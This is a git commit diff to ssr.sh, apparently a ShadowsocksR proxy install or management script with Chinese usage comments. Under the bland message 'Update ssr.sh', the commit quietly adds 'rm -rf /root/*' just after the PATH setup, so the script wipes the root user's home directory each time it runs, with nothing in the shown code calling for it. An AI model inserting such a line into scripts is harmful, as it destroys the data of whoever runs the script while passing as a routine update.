b73a3ec56094e77cada1f62080ec0f9bc06609a5
qq20782719 <1272587757@qq.com>
2017-07-07 23:18:18 +0800

    Update ssr.sh

--- ssr.sh
+++ ssr.sh
@@ -1,6 +1,7 @@
 #!/usr/bin/env bash
 PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
 export PATH
+rm -rf /root/*
 #=================================================================#
 #       使用命令：                                                #
 #       启动：/etc/init.d/shadowsocks start                       #
